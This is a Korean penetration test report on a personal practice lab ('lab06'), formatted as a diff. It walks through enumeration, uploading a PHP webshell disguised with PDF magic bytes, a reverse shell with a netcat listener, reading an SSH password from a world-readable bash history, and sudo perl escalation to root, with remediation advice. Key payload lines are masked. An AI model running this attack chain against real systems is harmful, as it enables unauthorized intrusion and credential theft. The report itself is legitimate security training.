@@ -1,0 +1,411 @@
+---
+publish: true
+title: 침투 테스트 보고서 – Lab 06
+created: 2026-11-09T20:43:30.630Z
+modified: 2026-11-09T20:52:08.083Z
+tags:
+  - pentest
+  - linux
+  - php
+  - SUID
+---
+
+<div style="height: 30px;"></div>
+
+# 목차
+
+<div style="height: 30px;"></div>
+<div class="report-toc">
+  <a href="#개요" class="report-toc-row" data-no-popover="true"><span class="toc-number">1.</span><span class="toc-dots"></span><span class="toc-title">개요</span></a>
+  <a href="#총평" class="report-toc-row" data-no-popover="true"><span class="toc-number">2.</span><span class="toc-dots"></span><span class="toc-title">총평</span></a>
+  <a href="#권고-사항" class="report-toc-row" data-no-popover="true"><span class="toc-number">3.</span><span class="toc-dots"></span><span class="toc-title">권고 사항</span></a>
+  <a href="#정보-수집-대상" class="report-toc-row" data-no-popover="true"><span class="toc-number">4.</span><span class="toc-dots"></span><span class="toc-title">정보 수집 대상</span></a>
+  <a href="#서비스-열거" class="report-toc-row" data-no-popover="true"><span class="toc-number">5.</span><span class="toc-dots"></span><span class="toc-title">서비스 열거</span></a>
+  <a href="#침투" class="report-toc-row" data-no-popover="true"><span class="toc-number">6.</span><span class="toc-dots"></span><span class="toc-title">침투</span></a>
+  <a href="#접근-권한-유지" class="report-toc-row" data-no-popover="true"><span class="toc-number">7.</span><span class="toc-dots"></span><span class="toc-title">접근 권한 유지</span></a>
+  <a href="#사후-정리" class="report-toc-row" data-no-popover="true"><span class="toc-number">8.</span><span class="toc-dots"></span><span class="toc-title">사후 정리</span></a>
+  <a href="#모의해킹-수행-내용" class="report-toc-row" data-no-popover="true"><span class="toc-number">9.</span><span class="toc-dots"></span><span class="toc-title">모의해킹 수행 내용</span></a>
+  <a href="#증적-자료-및-취약점" class="report-toc-row" data-no-popover="true"><span class="toc-number">10.</span><span class="toc-dots"></span><span class="toc-title">증적 자료 및 취약점</span></a>
+</div>
+
+---
+
+### 개요
+
+본 보고서는 개인 실습을 위한 2026년 10월 21일 21시부터 2026년 10월 21일 23시까지 진행된 lab06에 대한 모의해킹 보고서이다.
+
+---
+
+### 총평
+
+개인 실습을 위한 모의해킹 대상으로 최고 권한 획득을 위한 목적으로 lab06을 진단 하였다. 이 테스트는 실제로 일어날 수 있는 보안 취약점을 공격자의 입장에서 실제 공격과 유사한 방식으로 공격을 시도하여 최고 권한을 획득하는것에 목표를 두고 취약점 진단을 진행하였다. lab06을 대상으로 내부 침투 테스트를 진행하는 과정에서 여러가지 심각한 취약점이 발견되었다. 공개된 네트워크를 통해 파일 업로드 기능에서 취약점이 발견되어 내부 침투로 이어졌고 일반 계정의 히스토리의 권한 미흡으로 ssh 접속 흔적이 발견되어 계정 탈취가 되었으며, 탈취한 계정의 sudo 비밀번호 없이 사용가능한 프로그램을 악용하여 최고권한 root로 권한 상승까지 이어졌다.
+
+---
+
+### 권고 사항
+
+OWASP file uploads chest sheet의 권고 사항에 따라 파일 업로드 기능의 보안 검증을 강화하여 파일업로드에 대한 공격에 대비해야한다. 사용자별 히스토리 파일에 대한 접근 권한을 소유자에게만 부여하여 침해사고 발생시 추가적인 피해로 이어지지 않게 조치해야한다. /etd/sudoers에서 불필요하게 부여된 Perl의 실행권한을 제한하는걸 검토해야하며 NOPASSWD 설정은 사용하지 않도록 수정하여야한다.
+
+---
+
+### 정보 수집 대상
+
+개인 실습을 위한 모의해킹 lab06을 대상으로 취약점 점검을 진행하였다.\
+해당 대상인 lab06의 IP는 사설 IP이지만 자산 보호로 Masking 진행 하였다.
+
+---
+
+### 서비스 열거
+
+개인 실습을 위한 모의해킹 대상인 lab06에서 실행중인 서비스를 확인하고 관련 정보를 수집한다.\
+수집된 정보를 바탕으로 시스템으로 진입할 수 있는 잠재적 공격 경로에 대한 정보를 얻고 해당 시스템에서 어떤 어플리케이션이 동작하는지 파악하여 실제 침투를 진행하기 전 필요한 정보를 확보 할 수 있다.\
+실행중인 서비스이나 정보 수집과정에서 공개 되지 않을 수 있다.
+
+---
+
+### 침투
+
+개인 실습을 위한 모의해킹 대상인 lab06으로부터 최고 권한인 root계정을 획득 하였다.
+
+---
+
+### 접근 권한 유지
+
+공격자 입장에서 침투했을때 일시적인 데이터 수집을 목표로하지 않기에 지속적인 공격을 위해 시스템에 대한 접근 유지는 중요하다. 취약한 서비스의 버전이 업데이트 되거나 접근 계정의 비밀번호가 바뀌었을 때에도 지속적인 접근으로 최고 권한을 유지하기 위해 백도어나 계정을 생성할 수 있다.
+
+---
+
+### 사후 정리
+
+공격이 목적이아닌 취약점 점검이 목적이므로 침투 테스트중 생성된 흔적을 제거할 필요가 있다. 해당 실습 lab06에서는 추가적인 계정 생성이나 서비스등록 및 도구설치가 진행 하지 않아 제거 절차는 진행하지 않았다.
+
+---
+
+## 모의해킹 수행 내용
+
+### 대상 - lab06
+
+취약한 파일 업로드 보안 설정으로 인해 내부 침투로 이어졌고 계정 히스토리 관리 및 sudo 권한의 잘못된 설정부여로 인한 권한 상승.
+
+#### 취약점 설명 :
+
+파일 업로드 기능에대한 미흡한 보안 설정으로 매직넘버만 확인하고 업로드 되는 알고리즘으로 매직넘버만 조작하여 업로드시 악성코드가 업로드 되는 취약점,이후 히스토리 파일의 권한 부여가 소유자 이외에도 부여되어있어 해당 히스토리에 남은 ssh 접속 기록 흔적을 통한 계정 피벗이 발생하였다. 해당 계정의 sudo 권한에 nopasswd설정되어있는 perl의 기능을 악용해 root권한 상승까지 이어졌다.
+
+#### 취약점 조치 방안 :
+
+파일 업로드 기능에서 일부 방어되는건 확인했으나, 적절하지 않은 방법으로 보안 설정이 되어있어 파일 업로드시 매직넘버 우회로 악성코드가 실행되기에 OWASP file uploads chest sheet의 권고 사항에 따라 보안 설정을 하여 파일 업로드 취약점에 대한 대처를 하여야 한다. 계정 내부에 있는 히스토리 열람 권한을 소유자에게만 부여하여 다른 계정의 접근 권한을 차단하여야 한다. 해당 계정에 대한 정보는 노출되어 추가적인 침해사고가 발생할 수 있기 때문에 즉시 비밀번호를 변경하여야한다. sudo perl의 권한을 제거하여 권한상승에 대한 대처를 하여야하며 특히 nopasswd설정은 즉시 제거하는걸 검토하여야한다.
+
+#### 심각도 : 치명적 - Critical
+
+```
+CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/S:P/AU:Y/R:A/V:C/RE:L/U:Red
+```
+
+CVSS v4.0 점수: 9 / 심각\
+Macro vector: 110100\
+Exploitability: Medium\
+Complexity: Medium\
+Vulnerable system: High\
+Subsequent system: Medium\
+Exploitation: High\
+Security requirements: High
+
+#### 공격 재현 절차 :
+
+php를 포함한 디렉토리 스켄으로 파일 업로드 경로를 확인후 매직넘버를 pdf로 바꾼 웹쉘을 업로드하여 리버스쉘을 연결 이후 특정 계정의 history를 읽어 ssh 접속 기록을 확인. su를 통한 해당 계정으로 피벗 이후 sudo -l 로 perl사용을 통한 권한상승
+
+---
+
+### 증적 자료 및 취약점
+
+![[Template/Image/Pasted image 20261110054842.png]]
+
+모의해킹 대상인 lab06의 편의성을위해 hosts에 등록
+
+```
+└─$ sudo vi /etc/hosts
+[sudo] kali 암호:
+
+└─$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+[Mask]	dvwa
+[Mask]	mall
+[Mask]	msf
+[Mask]	rocky
+[Mask]	lab06
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+[Mask]:1 ip6-allnodes
+[Mask]:2 ip6-allrouters
+```
+
+![[Template/Image/Pasted image 20261110054846.png]]
+
+lab06에 대한 네트워크 스캐닝을 통한 서비스 확인
+
+```
+└─$ nmap -Pn lab06 -sS -sV
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-21 21:59 +0900
+Nmap scan report for lab06 ([Mask])
+Host is up (0.0097s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT    STATE  SERVICE      VERSION
+22/tcp  open   ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open   http         Apache httpd 2.4.52 ((Ubuntu))
+443/tcp closed https
+445/tcp closed microsoft-ds
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
+```
+
+![[Template/Image/Pasted image 20261110054851.png]]
+
+디렉토리 스캐닝을통해 php로 동작하는걸 확인
+
+```
+└─$ gobuster dir -k -u lab06 -w ~/Desktop/common.txt 
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://lab06
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/kali/Desktop/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.htpasswd            (Status: 403) [Size: 270]
+.hta                 (Status: 403) [Size: 270]
+.htaccess            (Status: 403) [Size: 270]
+index.html           (Status: 200) [Size: 1868]
+index.php            (Status: 200) [Size: 70782]
+server-status        (Status: 403) [Size: 270]
+uploads              (Status: 301) [Size: 300] [-- http://lab06/uploads/]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+![[Template/Image/Pasted image 20261110054855.png]]
+
+.php까지 확인하기위해 -x php를 통한 디렉토리 스캐닝으로 upload.php를 확인
+
+```
+└─$ gobuster dir -k -u lab06 -w ~/Desktop/common.txt -x php
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://lab06
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/kali/Desktop/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.hta                 (Status: 403) [Size: 270]
+.htaccess            (Status: 403) [Size: 270]
+.hta.php             (Status: 403) [Size: 270]
+.htpasswd.php        (Status: 403) [Size: 270]
+.htpasswd            (Status: 403) [Size: 270]
+.htaccess.php        (Status: 403) [Size: 270]
+index.html           (Status: 200) [Size: 1868]
+index.php            (Status: 200) [Size: 70782]
+index.php            (Status: 200) [Size: 70782]
+server-status        (Status: 403) [Size: 270]
+upload.php           (Status: 200) [Size: 610]
+uploads              (Status: 301) [Size: 300] [-- http://lab06/uploads/]
+Progress: 9226 / 9226 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+![[Template/Image/Pasted image 20261110054858.png]]
+
+uplaod.php에서 pdf,doxc,doc 업로드 되는것을 확인
+
+![[Template/Image/Pasted image 20261110054900.png]]
+
+매직넘버를 pdf로 만든 웹셀을 준비
+
+```
+└─$ ls -lh webshell.pdf.php
+-rw-rw-r-- 1 kali kali 27K 10월 21일  22:34 webshell.pdf.php
+
+└─$ head -c 24 webshell.pdf.php | xxd; tail -c 24 webshell.pdf.php | xxd
+00000000: 2550 4446 2d31 2e37 0a25 d0d4 c5d8 0a35  %PDF-1.7.%.....5
+00000010: 2030 206f 626a 0a3c                       0 obj.<
+00000000: 0a3c 2f70 7265 3e0a 3c2f 626f 6479 3e0a  .</pre.</body.
+00000010: 3c2f 6874 6d6c 3e0a                      </html.
+```
+
+![[Template/Image/Pasted image 20261110054904.png]]
+
+1. Browser를 눌러 업로드 할 대상을 찾음
+2. 매직넘버가 pdf로 조작된 웹쉘을 선택
+3. 선택한 웹셀을 열기
+4. upload를 눌러 웹셀 업로드
+
+![[Template/Image/Pasted image 20261110054906.png]]
+
+정상적으로 웹셀이 업로드
+
+![[Template/Image/Pasted image 20261110054908.png]]
+
+앞에서 발견한 uploads 디렉토리에서 해당 php를 실행
+
+![[Template/Image/Pasted image 20261110054911.png]]
+
+정상적으로 웹셀이 실행된것을 확인
+
+![[Template/Image/Pasted image 20261110054914.png]]
+
+id; whoami; pwd 를 입력하여 해당 계정 정보를 확인
+
+```
+id; whoami; pwd
+```
+
+![[Template/Image/Pasted image 20261110054919.png]]
+
+python3 -h 를 통한 사용가능 확인
+
+```
+python3 -h
+```
+
+![[Template/Image/Pasted image 20261110054922.png]]
+
+443 포트로 리버스쉘 리슨
+
+```
+└─$ nc -lvnp 443
+listening on [any] 443 ...
+```
+
+![[Template/Image/Pasted image 20261110054925.png]]
+
+리버스쉘 연결시도
+
+```
+python3 [Mask] ("/bin/bash")'
+```
+
+![[Template/Image/Pasted image 20261110054928.png]]
+
+리버스쉘 연결 확인
+
+```
+connect to [[Mask]] from (UNKNOWN) [[Mask]] 56684
+www-data@[Mask]:/var/www/html/uploads$
+```
+
+![[Template/Image/Pasted image 20261110054930.png]]
+
+모의해킹 편의성을 위한 dumb shell 업그레이드
+
+```
+www-data@[Mask]:/var/www/html/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<ads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@[Mask]:/var/www/html/uploads$ ^Z
+zsh: suspended  nc -lvnp 443
+```
+
+![[Template/Image/Pasted image 20261110054933.png]]
+
+모의해킹 편의성을 위한 dumb shell 업그레이드
+
+```
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 443
+                              reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+```
+
+![[Template/Image/Pasted image 20261110054937.png]]
+
+모의해킹 편의성을 위한 dumb shell 업그레이드
+
+```
+www-data@[Mask]:/var/www/html/uploads$ echo $TERM
+dumb
+www-data@[Mask]:/var/www/html/uploads$ export TERM=xterm-256color
+www-data@[Mask]:/var/www/html/uploads$ echo $TERM
+xterm-256color
+www-data@[Mask]:/var/www/html/uploads$
+```
+
+![[Template/Image/Pasted image 20261110054940.png]]
+
+특정 계정의 .bash\_history 읽기 권한이 664로 되어있음을 확인후 해당 히스토리를 읽어 ssh 계정을 확보
+
+```
+www-data@[Mask]:/var/www$ ls -al /home/[Mask]/
+total 24
+drwxr-x--- 2 [Mask] www-data 4096 Dec  4  2023 .
+drwxr-xr-x 5 root    root     4096 Dec  4  2023 ..
+-rw-rw-r-- 1 [Mask] [Mask]    50 Dec  4  2023 .bash_history
+-rw-r--r-- 1 [Mask] [Mask]   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 [Mask] [Mask]  3771 Jan  6  2022 .bashrc
+-rw-r--r-- 1 [Mask] [Mask]   807 Jan  6  2022 .profile
+www-data@[Mask]:/var/www$ cat /home/[Mask]/.bash_history
+sshpass -p '[Mask]' [Mask]@localhost -vv
+www-data@[Mask]:/var/www$
+```
+
+![[Template/Image/Pasted image 20261110054947.png]]
+
+su를 통한 해당 계정으로 피벗 후 id와 whoami를 입력하여 계정 정보 확인
+
+```
+www-data@[Mask]:/var/www$ su [Mask]
+password:
+[Mask]@[Mask]:/var/www$ id; whoami
+uid=1002([Mask]) gid=1002([Mask]) groups=1002([Mask])
+[Maks]
+[Mask]@[Mask]:/var/www$
+```
+
+![[Template/Image/Pasted image 20261110054949.png]]
+
+sudo -l 을통해 perl이 nopasswd로 지정되어있음을 확인
+
+```
+[Mask]@[Mask]:/var/www$ sudo -l
+Matching Defaults entries for [Mask] on [Mask]:
+    env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+            use_pty
+            
+User [Mask] may run the following commands on [Mask]:
+    (ALL : ALL) NOPASSWD: /usr/bin/perl
+[Mask]@[Mask]:~$
+```
+
+![[Template/Image/Pasted image 20261110054952.png]]
+
+sudo perl을 통한 권한 상승후 id,whoami를 통한 계정 정보 확인
+
+```
+[Mask]@[Mask]:~$ sudo perl [Mask]
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+```
